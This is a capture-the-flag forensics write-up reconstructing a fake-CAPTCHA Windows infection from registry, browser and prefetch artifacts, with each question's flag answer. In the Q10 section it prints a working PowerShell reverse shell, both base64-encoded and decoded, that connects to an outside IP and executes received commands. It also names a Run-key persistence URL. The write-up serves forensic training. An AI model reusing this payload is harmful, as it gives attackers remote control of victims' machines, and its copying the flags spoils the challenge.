# The Shell Power - Official Writeup
**Author** : sn0_0wyy (Hit me up on Discord if you got stuck on something!! same username)


## Challenge Scenario

A Windows system was infected after the user interacted with a malicious link received via Discord.
The objective is to investigate disk artifacts, reconstruct the attack chain, and identify persistence behavior.

All timestamps are in UTC using format: `YYYY-MM-DD HH:MM:SS`.
All answers follow: `CyberSphere{.*}`.

---

## Q1. What is the computer name of the system?

Load the `SYSTEM` hive in Registry Explorer:

`ControlSet001\Control\ComputerName\ComputerName`

Value:
`ComputerName = DESKTOP-6F1LGKO`

**Answer:** `CyberSphere{DESKTOP-6F1LGKO}`

---

## Q2. What is the OS build number of the installed Windows system?

Path:
`Microsoft\Windows NT\CurrentVersion`

Value:
`CurrentBuildNumber = 19045`

**Answer:** `CyberSphere{19045}`

---

## Q3. What is the victim's username?

Path:
`Microsoft\Windows NT\CurrentVersion\ProfileList\<SID>`

Value:
`ProfileImagePath = C:\Users\someone`

**Answer:** `CyberSphere{someone}`

---

## Q4. What version of WinRAR is installed?

Path:
`Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver`

Value:
`DisplayVersion = 7.20.0`

Or you can check the [$MFT](https://www.youtube.com/watch?v=B4b6Ocf3wYs) file  no need to parse it but you can run **strings** on it and grep for a winrar installer .exe where you can find the version in the filename!!

**Answer:** `CyberSphere{7.20}`

---

## Q5. How long did the Discord installer download take? (seconds)

From browser History database:(Open it with sqlite3 db parser)
`C:\Users\someone\AppData\Local\Microsoft\Edge\User Data\Default\History`

Calculation:

```text
13420727668625162 - 13420727253636370 = 414988792
414988792 / 1,000,000 ~= 415 seconds
```

**Answer:** `CyberSphere{415}`

---

## Q6. When did the Discord installer start? (UTC)

From Prefetch:
`DISCORDSETUP.EXE`

Run time:
`2026-04-15 11:57:26`

**Answer:** `CyberSphere{2026-04-15 11:57:26}`

---

## Q7. What is the last URL visited before infection?

Browser artifact analysis shows:

**Answer:** `CyberSphere{https://recaptcha-verification-step.netlify.app/}`

---

## Q8. What is the timestamp of that visit? (UTC)

Last visit timestamp:

**Answer:** `CyberSphere{2026-04-15 12:46:36}`

---

## Q9. What is the URL of the script executed via Run dialog?

The commands that were run inside the **Run Dialog** are saved in the user's hive **NTUSER.DAT** under this path : 

Registry key:
`NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`

You'll find a Base64 string decode and you should have this link : 

Decoded value:
`https://recaptcha-verification-step.netlify.app/Verify.ps1`

**Answer:** `CyberSphere{https://recaptcha-verification-step.netlify.app/Verify.ps1}`

---

## Q10. What is the SHA-256 of the reverse shell payload?

Verify.ps1 : 
```powershell

powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANQAyAC4AMQA2AC4AMQA5ADEALgA3ADkAIgAsADcAMAAzADkAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAwACkAewAkAGQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAdAByAHkAewAkAG8APQBpAGUAeAAgACQAZAAgADIAPgAmADEAIAAzAD4AJgAxACAANAA+ACYAMQAgADUAPgAmADEAIAA2AD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwB9AGMAYQB0AGMAaAB7ACQAbwA9ACQAXwB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAfQBpAGYAKABbAHMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBFAG0AcAB0AHkAKAAkAG8AKQApAHsAJABvAD0AIgAiAH0AJABwAD0AIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwBbAGIAeQB0AGUAWwBdAF0AJABzAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwArACQAcAApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=

```
Decode that payload in CyberChef : From Base64 -> Remove Null Bytes (Because windows PS uses UTF-16 Encoding) then Calculate the SHA256 via -> SH2 option 256 :

```
$ErrorView="NormalView";$ErrorActionPreference="Continue";$c=New-Object System.Net.Sockets.TCPClient("52.16.191.79",7039);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=([text.encoding]::ASCII).GetString($b,0,$i);try{$o=iex $d 2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}catch{$o=$_|Out-String}if([string]::IsNullOrEmpty($o)){$o=""}$p="PS "+(pwd).Path+"> ";[byte[]]$sb=([text.encoding]::ASCII).GetBytes($o+$p);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()

```


Recovered payload SHA-256:

**Answer:** `CyberSphere{2dc08a81a579ddb1035e16378fc21e57f5df0590b1c88a2213e7d91fa7bb01d7}`

---

## Q11. What IP and port did the reverse shell connect to?


From the last decrypted payload we have : ("52.16.191.79",7039)


**Answer:** `CyberSphere{52.16.191.79:7039}`

---

## Q12. What is the name of the persistence mechanism (fake service)?

One of the most common persistence mechanisms in Windows involves the Run registry key:

Registry path:
`NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run`

Value name:
`SystemHealthMonitoring`

**Answer:** `CyberSphere{SystemHealthMonitoring}`

---

## Q13. What is the final payload URL used for persistence?

Inside the same key we found in : 
`NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run`


We can find persistence payload :

**Answer:** `CyberSphere{http://52.16.191.79:6969/HealthCheck.ps1}`

That HealthCheck.ps1 have the same reverseshell we decoded earlier that's getting triggered each time the user log in/off .

---

## Q14. The attacker trolled the victim by leaving a note. What is the content of this note?

The note is located at:
`C:\Users\someone\Desktop\pwned.txt`

Contents:
`RIGGED KEKW`

**Answer:** `CyberSphere{RIGGED KEKW}`

---

## Attack Chain Summary

1. User installs Discord.
2. User visits malicious website.
3. Fake CAPTCHA social-engineers execution.
4. Victim runs malicious PowerShell URL via Run dialog.
5. PowerShell downloads and executes script.
6. Reverse shell connects to `52.16.191.79:7039`.
7. Persistence added via `SystemHealthMonitoring`.
8. Final persistence script fetched from `http://52.16.191.79:6969/HealthCheck.ps1`.

